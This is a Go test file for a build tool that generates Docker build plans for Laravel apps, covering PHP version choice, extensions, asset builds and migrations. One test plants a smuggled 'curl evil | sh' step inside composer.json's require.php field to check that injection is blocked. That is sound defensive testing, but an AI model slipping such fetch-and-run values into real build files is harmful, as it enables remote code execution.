package buildkit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/trypando/pando/internal/adapter/api"
)

const laravelComposer = `{"require": {"php": "^8.3", "laravel/framework": "^13.0"}}`

// TestR095_ALaravelAppIsBuiltOnThePHPItsComposerJSONAsksFor asserts R-095.
//
// nixpacks installed a PHP older than the 8.3 Laravel 13 requires, hid the
// mismatch with --ignore-platform-reqs, and the build failed parsing syntax
// its PHP did not know (issue #58). The version is read from require.php, and
// the newest published release it allows is used.
func TestR095_ALaravelAppIsBuiltOnThePHPItsComposerJSONAsksFor(t *testing.T) {
	for constraint, want := range map[string]string{
		"":               "8.5",
		"^8.3":           "8.5",
		">=8.2":          "8.5",
		"~8.2":           "8.5", // Composer's two-part tilde is a caret
		"~8.2.0":         "8.2",
		"8.2.*":          "8.2",
		"8.3":            "8.3",
		">=8.1 <8.4":     "8.3",
		">=8.1,<8.4":     "8.3",
		"8.1 - 8.3":      "8.3",
		"^7.4|^8.0":      "8.5",
		"^7.3 || ~7.4.0": "7.4",
		"7.4.*":          "7.4",
		">=8.2.5 <8.3":   "8.2",
		"^9.0":           "8.5", // nothing published; the platform check says so
	} {
		require.Equal(t, want, phpForConstraint(constraint), "require.php %q", constraint)
	}

	app, ok := readLaravelApp(writeFiles(t, map[string]string{
		"artisan":       "",
		"composer.json": `{"require": {"php": "^8.1", "laravel/framework": "^10.0"}, "config": {"platform": {"php": "8.2.12"}}}`,
	}))
	require.True(t, ok)
	require.Equal(t, "8.2", app.PHP, "a platform the author pinned is the PHP they run")
}

func TestALaravelAppIsReadAsOne(t *testing.T) {
	_, ok := readLaravelApp(writeFiles(t, map[string]string{"composer.json": laravelComposer}))
	require.False(t, ok, "a package built on Laravel has no artisan")

	_, ok = readLaravelApp(writeFiles(t, map[string]string{
		"artisan": "", "composer.json": `{"require": {"php": "^8.3", "slim/slim": "^4"}}`,
	}))
	require.False(t, ok, "an artisan script is not Laravel without the framework")

	app, ok := readLaravelApp(writeFiles(t, map[string]string{
		"artisan":           "",
		"composer.json":     `{"require": {"php": "^8.3", "laravel/framework": "^13.0", "ext-intl": "*", "ext-mbstring": "*", "ext-made_up": "*"}}`,
		"composer.lock":     `{"packages": [{"name": "x/y", "require": {"ext-zip": "*", "ext-opcache": "*", "ext-redis": "*"}}]}`,
		".env.example":      "APP_KEY=\nDB_CONNECTION=pgsql\n",
		"package.json":      `{"scripts": {"build": "vite build", "dev": "vite"}}`,
		"package-lock.json": "{}",
	}))
	require.True(t, ok)
	// Built in (mbstring), compiled into 8.5 (opcache) and unknown (made_up)
	// are not installed; what the app, its lockfile and its database need is.
	require.Equal(t, []string{"bcmath", "intl", "pdo_mysql", "pdo_pgsql", "redis", "zip"}, app.Extensions)
	require.True(t, app.Assets)
	require.Equal(t, "npm ci", app.Install)
	require.Equal(t, "22", app.Node)
}

// TestR105_APHPVersionMismatchIsNamedInTheBuild asserts R-105.
//
// The build said `syntax error, unexpected token "{"` and nothing about PHP
// versions. Composer is now told which PHP the app runs on, read from the
// runtime image itself, and resolves for it without --ignore-platform-reqs on
// the version; the platform check then runs where the extensions are, and a
// failure says which PHP Pando chose and why.
func TestR105_APHPVersionMismatchIsNamedInTheBuild(t *testing.T) {
	root := writeFiles(t, map[string]string{
		"artisan": "", "composer.json": `{"require": {"php": "^8.2", "laravel/framework": "^12.0"}}`,
	})
	app, ok := readLaravelApp(root)
	require.True(t, ok)
	name, err := writeLaravelPlan(root, app)
	require.NoError(t, err)
	body, err := os.ReadFile(filepath.Join(root, name))
	require.NoError(t, err)
	plan := string(body)

	require.Contains(t, plan, "FROM php:8.5-apache AS runtime")
	require.Contains(t, plan, `composer config --global platform.php "$(cat /php-version)"`)
	require.NotContains(t, plan, "--ignore-platform-reqs", "the PHP version is checked, not ignored")
	require.Contains(t, plan, "--ignore-platform-req='ext-*'\n", "extensions are checked where they are installed")
	require.NotContains(t, plan, "--ignore-platform-req=php", "with no lock, Composer resolves for the runtime's PHP")
	require.Contains(t, plan, "composer check-platform-reqs --no-dev ||")
	require.Contains(t, plan, "Pando chose PHP 8.5 from composer.json's require.php (^8.2)")
	require.Contains(t, plan, "$(php -r 'echo PHP_VERSION;')", "the message names the PHP that was installed")
	require.NotContains(t, plan, "AS assets", "no package.json, no asset build")
}

// TestR095_ALaravelFrontEndIsBuiltWhereArtisanRuns asserts R-095.
//
// The Wayfinder vite plugin in Laravel's starter kits runs `php artisan
// wayfinder:generate`; built on the Node image, the front end failed with
// "php: not found" (issue #90).
func TestR095_ALaravelFrontEndIsBuiltWhereArtisanRuns(t *testing.T) {
	root := writeFiles(t, map[string]string{
		"artisan": "", "composer.json": laravelComposer,
		"package.json": `{"scripts": {"build": "vite build"}}`, "package-lock.json": "{}",
	})
	name, err := buildpackPlan(api.BuildRequest{}, root)
	require.NoError(t, err)
	body, err := os.ReadFile(filepath.Join(root, name))
	require.NoError(t, err)
	plan := string(body)

	app := strings.Index(plan, "FROM runtime AS app\n")
	autoload := strings.Index(plan, "composer dump-autoload")
	assets := strings.Index(plan, "FROM app AS assets\n")
	build := strings.Index(plan, "RUN npm run build")
	require.True(t, app >= 0 && app < autoload && autoload < assets && assets < build,
		"the front end is built on the app with its PHP, extensions and autoloader:\n%s", plan)
	require.Contains(t, plan[assets:build], "ln -sf ../lib/node_modules/npm/bin/npm-cli.js /usr/local/bin/npm")
	require.Contains(t, plan[assets:build], "RUN npm ci\n")
	require.NotContains(t, plan, "FROM node:", "Node is copied in, not a base of its own")
}

func TestALaravelPlanServesPublicAndMigratesBeforeItStarts(t *testing.T) {
	root := writeFiles(t, map[string]string{
		"artisan": "", "composer.json": laravelComposer,
		"package.json": `{"scripts": {"build": "vite build"}}`,
	})
	name, err := buildpackPlan(api.BuildRequest{}, root)
	require.NoError(t, err, "a Laravel app is planned before its package.json is read as a site")
	body, err := os.ReadFile(filepath.Join(root, name))
	require.NoError(t, err)
	plan := string(body)

	require.Contains(t, plan, "FROM app AS assets\nCOPY --from=node:22-slim /usr/local/bin/node /usr/local/bin/node\n",
		"the asset build runs where PHP and vendor/ are, so vite plugins can run artisan")
	require.Contains(t, plan, "COPY --from=vendor /app/vendor vendor", "the asset build can import from vendor/")
	require.Contains(t, plan, "FROM app\nCOPY --from=assets /var/www/html/public/build public/build\n")
	require.Contains(t, plan, "RUN docker-php-ext-install -j$(nproc) bcmath pdo_mysql")
	require.NotContains(t, plan, "apt-get", "the default extensions need no system library")
	require.Contains(t, plan, "DocumentRoot /var/www/html/public")
	require.Contains(t, plan, "AllowOverride All", "Laravel's .htaccess routes to index.php")
	require.Contains(t, plan, "EXPOSE 80")
	require.Contains(t, plan, `ENTRYPOINT ["/bin/sh", "-c"]`)
	require.Contains(t, plan, `CMD ["php artisan migrate --force --no-interaction && `)
	require.True(t, strings.HasSuffix(plan, "exec apache2-foreground\"]\n"))
}

func TestPHPExtensionsGetTheirLibrariesOnce(t *testing.T) {
	steps := extensionSteps([]string{"gd", "pdo_pgsql", "pgsql", "redis"})
	require.Contains(t, steps, "apt-get install -y --no-install-recommends libfreetype6-dev libjpeg62-turbo-dev libpng-dev libpq-dev libwebp-dev &&")
	require.Contains(t, steps, "RUN docker-php-ext-configure gd --with-freetype --with-jpeg --with-webp\n")
	require.Contains(t, steps, "RUN docker-php-ext-install -j$(nproc) gd pdo_pgsql pgsql\n")
	require.Contains(t, steps, "RUN pecl install redis && docker-php-ext-enable redis\n")
	require.Empty(t, extensionSteps(nil))
}

func TestAConstraintIsWrittenIntoThePlanAsOnlyAConstraint(t *testing.T) {
	root := writeFiles(t, map[string]string{
		"artisan": "", "composer.json": `{"require": {"php": "^8.3\nRUN curl evil | sh", "laravel/framework": "^13.0"}}`,
	})
	app, ok := readLaravelApp(root)
	require.True(t, ok)
	name, err := writeLaravelPlan(root, app)
	require.NoError(t, err)
	body, err := os.ReadFile(filepath.Join(root, name))
	require.NoError(t, err)
	for _, line := range strings.Split(string(body), "\n") {
		require.False(t, strings.HasPrefix(line, "RUN curl"), "a newline in require.php does not start a build step")
	}
}

// TestR095_ALaravelAppRunsOnAPHPItsLockedPackagesAccept asserts R-095.
//
// composer.json allowed PHP 8.5; nette/utils in composer.lock allowed up to
// 8.4, and `composer install` refused the php:8.5 image Pando chose (issue
// #90). The newest PHP every locked package accepts is the one chosen.
func TestR095_ALaravelAppRunsOnAPHPItsLockedPackagesAccept(t *testing.T) {
	app, ok := readLaravelApp(writeFiles(t, map[string]string{
		"artisan":       "",
		"composer.json": `{"require": {"php": "^8.2", "laravel/framework": "^11.0"}}`,
		"composer.lock": `{"packages": [
			{"name": "nette/utils", "require": {"php": "8.0 - 8.4"}},
			{"name": "nette/schema", "require": {"php": "8.1 - 8.4"}},
			{"name": "laravel/framework", "require": {"php": "^8.2", "ext-mbstring": "*"}},
			{"name": "psr/log", "require": {"php": ">=8.0.0"}}
		]}`,
	}))
	require.True(t, ok)
	require.Equal(t, "8.4", app.PHP)

	// Composer, on its own image's newer PHP, refused that lock anyway; the
	// runtime image's platform check is what judges the PHP version.
	root := writeFiles(t, map[string]string{
		"artisan": "", "composer.json": `{"require": {"php": "^8.2", "laravel/framework": "^11.0"}}`, "composer.lock": `{"packages": []}`,
	})
	locked, ok := readLaravelApp(root)
	require.True(t, ok)
	name, err := writeLaravelPlan(root, locked)
	require.NoError(t, err)
	body, err := os.ReadFile(filepath.Join(root, name))
	require.NoError(t, err)
	require.Contains(t, string(body), "--ignore-platform-req='ext-*' --ignore-platform-req=php\n")
	require.Contains(t, string(body), "composer check-platform-reqs --no-dev ||")

	require.Equal(t, "8.5", phpForConstraints([]string{"^8.2", ">=8.0"}))
	require.Equal(t, "8.5", phpForConstraints([]string{"^8.2", "^7.4"}),
		"nothing satisfies every constraint, so composer.json's decides and the platform check names the package")
	require.Equal(t, "8.5", phpForConstraints(nil))
}
